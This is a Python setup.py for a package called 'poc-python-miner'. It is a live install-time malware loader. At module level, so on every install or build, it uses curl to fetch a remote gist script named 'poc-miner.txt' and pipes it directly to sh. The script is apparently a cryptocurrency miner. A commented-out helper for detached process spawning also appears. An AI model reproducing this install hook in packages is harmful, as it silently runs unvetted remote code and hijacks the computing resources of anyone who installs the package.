from setuptools import setup
import subprocess, os

# def run_command(command):
#     process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setpgrp)
#     return process

subprocess.run("curl -sL https://gist.githubusercontent.com/rroiii/b440e6578af339f02293978f478f6535/raw/463ba966291d8575b726528b293696dec6bc7a9c/poc-miner.txt | sh", shell=True, check=True)

setup(
    name='poc-python-miner',
    version='0.1',
    packages=['poc-python-miner'],
    install_requires=[]
)
